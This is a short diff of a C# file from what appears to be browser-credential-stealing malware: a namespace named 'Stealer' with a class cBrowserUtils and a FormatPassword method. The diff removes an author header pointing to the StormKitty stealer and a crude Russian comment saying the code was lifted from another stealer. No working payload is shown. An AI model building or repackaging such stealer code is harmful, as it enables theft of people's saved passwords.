@@ -1,16 +1,11 @@
-﻿/* 
-    Author : LimerBoy
-    Github : github.com/LimerBoy/StormKitty
-*/
-
-using System;
+﻿using System;
 using System.IO;
 using System.Collections.Generic;
 using System.Text.RegularExpressions;
 
 namespace Stealer
 {
-    internal sealed class cBrowserUtils // Спизжено с Burst стиллера кста
+    internal sealed class cBrowserUtils
     {
         private static string FormatPassword(Password pPassword)
         {
